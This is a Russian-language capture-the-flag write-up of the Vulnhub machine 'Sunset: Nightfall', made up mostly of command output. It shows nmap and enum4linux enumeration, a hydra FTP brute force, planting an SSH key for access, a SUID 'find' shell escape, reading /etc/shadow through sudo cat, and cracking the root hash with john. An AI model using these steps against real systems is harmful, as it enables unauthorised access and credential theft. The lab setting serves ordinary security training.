# Sunset: Nightfall
## Vulnhub machine

- Название: Sunset: Nightfall
- OS: Linux
- Ресурс: Vulnhub
- Сложность: Beginner
- Дата релиза: 29.08.19
- Оригинальное описание: 
>nightfall is a born2root VM designed for beginners.
Virtualbox is strongly recommended for doing this challenge.
If you need to contact me for hints you can do it via twitter here: @whitecr0w1
You may have issues using VMware


## Write-up

```html
┌─[root@parrot]─[/home/user]
└──╼ #nmap -p- -A 192.168.56.123
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 06:44 AKDT
Nmap scan report for 192.168.56.123
Host is up (0.00077s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         pyftpdlib 1.5.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.56.123:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9:25:e1:4f:41:c6:0f:be:31:21:7b:27:e3:af:49:a9 (RSA)
|   256 38:15:c9:72:9b:e0:24:68:7b:24:4b:ae:40:46:43:16 (ECDSA)
|_  256 9b:50:3b:2c:48:93:e1:a6:9d:b4:99:ec:60:fb:b6:46 (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 13
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolOld, Support41Auth, SupportsTransactions, InteractiveClient, FoundRows, Speaks41ProtocolNew, IgnoreSigpipes, ConnectWithDatabase, LongColumnFlag, SupportsCompression, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, ODBCClient, IgnoreSpaceBeforeParenthesis, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: 7i|Rf,COC?Tf&);+d:1
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:21:92:2B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: NIGHTFALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: NIGHTFALL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: nightfall
|   NetBIOS computer name: NIGHTFALL\x00
|   Domain name: nightfall
|   FQDN: nightfall.nightfall
|_  System time: 2020-04-25T10:45:26-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-25T14:45:25
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.77 ms 192.168.56.123

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.00 seconds
```

>Помимо прочего, присутствует ftp порт, который пригодится далее.

```html 
┌─[✗]─[root@parrot]─[/home/user]
└──╼ #enum4linux 192.168.56.123
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Apr 26 05:55:48 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.56.123
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 192.168.56.123    |
 ====================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================== 
|    Nbtstat Information for 192.168.56.123    |
 ============================================== 
Looking up status of 192.168.56.123
	NIGHTFALL       <00> -         B ACTIVE  Workstation Service
	NIGHTFALL       <03> -         B ACTIVE  Messenger Service
	NIGHTFALL       <20> -         B ACTIVE  File Server Service
	..__MSBROWSE__. <01> - GROUP   B ACTIVE  Master Browser
	WORKGROUP       <00> - GROUP   B ACTIVE  Domain/Workgroup Name
	WORKGROUP       <1d> -         B ACTIVE  Master Browser
	WORKGROUP       <1e> - GROUP   B ACTIVE  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on 192.168.56.123    |
 ======================================= 
[+] Server 192.168.56.123 allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for 192.168.56.123    |
 ============================================= 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on 192.168.56.123    |
 ======================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.56.123 from smbclient: 
[+] Got OS info for 192.168.56.123 from srvinfo:
	NIGHTFALL      Wk Sv PrQ Unx NT SNT Samba 4.9.5-Debian
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 =============================== 
|    Users on 192.168.56.123    |
 =============================== 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 =========================================== 
|    Share Enumeration on 192.168.56.123    |
 =========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.56.123
//192.168.56.123/print$	Mapping: DENIED, Listing: N/A
//192.168.56.123/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ====================================================== 
|    Password Policy Information for 192.168.56.123    |
 ====================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 192.168.56.123 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Missing required parameter 'digestmod'.

[+] Trying protocol 445/SMB...

	[!] Protocol failed: Missing required parameter 'digestmod'.


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ================================ 
|    Groups on 192.168.56.123    |
 ================================ 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================= 
|    Users on 192.168.56.123 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1679783218-3562266554-4049818721
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\nightfall (Local User)
S-1-22-1-1001 Unix User\matt (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
[+] Enumerating users using SID S-1-5-21-1679783218-3562266554-4049818721 and logon username '', password ''
S-1-5-21-1679783218-3562266554-4049818721-500 *unknown*\*unknown* (8)
S-1-5-21-1679783218-3562266554-4049818721-501 NIGHTFALL\nobody (Local User)
 =============================================== 
|    Getting printer info for 192.168.56.123    |
 =============================================== 
No printers returned.

enum4linux complete on Sun Apr 26 05:56:16 2020<
```

>Удалось получить список существующих пользователей, далее пробуем брутить ftp:

```html
┌─[✗]─[root@parrot]─[/home/user]
└──╼ #hydra -l matt -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.123
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-26 06:03:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.56.123:21/
[21][ftp] host: 192.168.56.123   login: matt   password: cheese
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-26 06:03:43
```

>Входим как matt с полученым паролем:

```html
┌─[root@parrot]─[/home/user]
└──╼ #ftp 192.168.56.123
Connected to 192.168.56.123.
220 pyftpdlib 1.5.5 ready.
Name (192.168.56.123:user): matt
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rw-------   1 matt     matt            0 Aug 28  2019 .bash_history
-rw-r--r--   1 matt     matt          220 Aug 26  2019 .bash_logout
-rw-r--r--   1 matt     matt         3526 Aug 26  2019 .bashrc
drwx------   3 matt     matt         4096 Aug 28  2019 .gnupg
drwxr-xr-x   3 matt     matt         4096 Aug 26  2019 .local
-rw-r--r--   1 matt     matt          807 Aug 26  2019 .profile
-rw-------   1 matt     matt            0 Aug 28  2019 .sh_history
226 Transfer complete.
```

>Для дальнейших действий нам понадобится пробросить ssh, поэтому создадим директорию, а на своей машине ключи доступа:

```html
ftp> mkdir .ssh
257 "/.ssh" directory created.
ftp> ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rw-------   1 matt     matt            0 Aug 28  2019 .bash_history
-rw-r--r--   1 matt     matt          220 Aug 26  2019 .bash_logout
-rw-r--r--   1 matt     matt         3526 Aug 26  2019 .bashrc
drwx------   3 matt     matt         4096 Aug 28  2019 .gnupg
drwxr-xr-x   3 matt     matt         4096 Aug 26  2019 .local
-rw-r--r--   1 matt     matt          807 Aug 26  2019 .profile
-rw-------   1 matt     matt            0 Aug 28  2019 .sh_history
drwxr-xr-x   2 root     root         4096 Apr 26 14:07 .ssh
226 Transfer complete.
ftp> cd .ssh
250 "/.ssh" is the current directory.
```

>Создаем ключи без парольной фразы и делаем копию публичного ключа с именем "authorized_keys":

```html
┌─[✗]─[root@parrot]─[/home/user]
└──╼ #ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:Itigx3iVZvUrZ68vEPpFlyBr25ZWuW+J9JXWv9U+xyQ root@parrot
The key's randomart image is:
+---[RSA 3072]----+
|      .          |
|     o...        |
|  . =  o.. o     |
| + B  + ..=      |
|o = ooo=S+ .   o |
| o  ..o=*.o   E +|
|     . = ..+ + ++|
|      . ... =  o=|
|        .o..   .=|
+----[SHA256]-----+

┌─[✗]─[root@parrot]─[~/.ssh]
└──╼ #ls
id_rsa  id_rsa.pub  known_hosts
┌─[root@parrot]─[~/.ssh]
└──╼ #cp id_rsa.pub authorized_keys
```

>Поместим ключ в созданную директроию .ssh:

```html 
ftp> put authorized_keys
local: authorized_keys remote: authorized_keys
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
565 bytes sent in 0.00 secs (4.9434 MB/s)
ftp> ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rw-r--r--   1 root     root          565 Apr 27 12:08 authorized_keys
226 Transfer complete.
```

>И подключаемся как matt:

```html
┌─[root@parrot]─[~/.ssh]
└──╼ #ssh matt@192.168.56.123
Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Aug 28 18:31:27 2019 from 192.168.1.182
matt@nightfall:~$ id
uid=1001(matt) gid=1001(matt) groups=1001(matt)
```

>Пробуем взять флаг юзера nightfall:

```html
matt@nightfall:/home/nightfall$ cat user.txt
cat: user.txt: Permission denied
```

>Ясно, придется совершать горизонтальную эскалацию прав. Просмотрим разрешения, данные нам:

```html
matt@nightfall:/home$ find / -perm -u=s -type f 2>/dev/null
/scripts/find
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
```

>Присутствует некий скрипт, который работает так же как и утилита find, но при этом выполняется от юзера nightfall:

```html
matt@nightfall:/home$ cd /scripts
matt@nightfall:/scripts$ ls
find
```

>Попробуем через него получить доступ к оболочке:

```html
matt@nightfall:/scripts$ ./find . -exec /bin/sh -p \; -quit
$ id
uid=1001(matt) gid=1001(matt) euid=1000(nightfall) egid=1000(nightfall) groups=1000(nightfall),1001(matt)
```

>Берем флаг юзера:

```html
$ cd nightfall
$ ls
user.txt
$ cat user.txt
97fb7140ca325ed96f67be**********
```

>Далее так же закидываем в .ssh публичный ключ:

```html
$ mkdir .ssh
$ cd .ssh
$ wget http://192.168.56.119:8000/authorized_keys
--2020-04-27 08:48:25--  http://192.168.56.119:8000/authorized_keys
Connecting to 192.168.56.119:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 565 [application/octet-stream]
Saving to: ‘authorized_keys’

authorized_keys         100%[==============================>]     565  --.-KB/s    in 0s      

2020-04-27 08:48:25 (8.10 MB/s) - ‘authorized_keys’ saved [565/565]

$ ls
authorized_keys
```

>И подключаемся, но как nightfall:

```html
┌─[✗]─[root@parrot]─[//root/.ssh]
└──╼ #ssh -i id_rsa nightfall@192.168.56.123
Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Aug 28 18:35:04 2019 from 192.168.1.182
nightfall@nightfall:~$ id
uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
```

>Осталась вертикальная эскалация, просмотрим что мы можем выполнять от root:

```html
nightfall@nightfall:~$ sudo -l
Matching Defaults entries for nightfall on nightfall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nightfall may run the following commands on nightfall:
    (root) NOPASSWD: /usr/bin/cat
```

>Мы можем читать файлы, если бы флаг рута имел стандартное имя "root.txt", мы бы смогли уже его взять, но мне неудалось его прочесть. Чтож, в таком случае целью будут passwd и shadow:

```html
nightfall@nightfall://$ sudo -u root cat etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
avahi:x:106:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:107:118::/var/lib/saned:/usr/sbin/nologin
colord:x:108:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false
nightfall:x:1000:1000:nightfall,,,:/home/nightfall:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:0:0:MySQL Server,,,:/nonexistent:/bin/false
matt:x:1001:1001:,,,:/home/matt:/bin/bash
```

>Ничего интересного, далее shadow:

```html
nightfall@nightfall://$ sudo -u root cat etc/shadow
root:$6$JNHsN5GY.jc9CiTg$MjYL9NyNc4GcYS2zNO6PzQNHY2BE/YODBUuqsrpIlpS9LK3xQ6coZs6lonzURBJUDjCRegMHSF5JwCMG1az8k.:18134:0:99999:7:::
daemon:*:18126:0:99999:7:::
bin:*:18126:0:99999:7:::
sys:*:18126:0:99999:7:::
sync:*:18126:0:99999:7:::
games:*:18126:0:99999:7:::
man:*:18126:0:99999:7:::
lp:*:18126:0:99999:7:::
mail:*:18126:0:99999:7:::
news:*:18126:0:99999:7:::
uucp:*:18126:0:99999:7:::
proxy:*:18126:0:99999:7:::
www-data:*:18126:0:99999:7:::
backup:*:18126:0:99999:7:::
list:*:18126:0:99999:7:::
irc:*:18126:0:99999:7:::
gnats:*:18126:0:99999:7:::
nobody:*:18126:0:99999:7:::
_apt:*:18126:0:99999:7:::
systemd-timesync:*:18126:0:99999:7:::
systemd-network:*:18126:0:99999:7:::
systemd-resolve:*:18126:0:99999:7:::
messagebus:*:18126:0:99999:7:::
avahi-autoipd:*:18126:0:99999:7:::
avahi:*:18126:0:99999:7:::
saned:*:18126:0:99999:7:::
colord:*:18126:0:99999:7:::
hplip:*:18126:0:99999:7:::
nightfall:$6$u9n0NMGDN2h3/Npy$y/PVdaqMcdobHf4ZPvbrHNFMwMkPWwamWuKGxn2wqJygEC09UNJNb10X0HBK15Hs4ZwyFtdwixyyfu2QEC1U4/:18134:0:99999:7:::
systemd-coredump:!!:18126::::::
sshd:*:18126:0:99999:7:::
mysql:!:18126:0:99999:7:::
matt:$6$2u38Z1fOk8zIC5kO$oSfp/Ic0Uhb9225EdHB63ugob.B58mPuJJ8YpMB9hNaZAoJk9n3rhs9DHobzmsB20E5Yxjqsnn1x.QGKeAmiR1:18134:0:99999:7:::
```

>Копируем первую строку, сохраняем в файл hash на своей машине и пробуем брут с помощью john:

```html
┌─[user@parrot]─[~/Downloads]
└──╼ $john hash
Created directory: /home/user/.john
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
miguel2          (root)
1g 0:00:00:21 DONE 2/3 (2020-04-27 04:55) 0.04608g/s 1504p/s 1504c/s 1504C/s miguel2..jesucristo2
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

>Логинимся как root и берем последний флаг, который как и предполагалось, имеет нестандартное имя:

```html
nightfall@nightfall://$ su root
Password: 
root@nightfall://# id
uid=0(root) gid=0(root) groups=0(root)
root@nightfall://# cd root
root@nightfall://root# ls
root_super_secret_flag.txt
root@nightfall://root# cat root_super_secret_flag.txt 
Congratulations! Please contact me via twitter and give me some feedback! @whitecr0w1
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
................................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...................................................................................
..............................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.................................................................................
............................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...............................................................................
..........................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.............................................................................
........................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...........................................................................
......................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.........................................................................
....................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.......................................................................
...................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@......................................................................
..................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.....................................................................
.................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@....................................................................
................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...................................................................
................................................................&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&...................................................................
~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~
Thank you for playing! - Felipe Winsnes (whitecr0wz)                                 flag{9a5b21fc6719fe33004d66**********}
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```
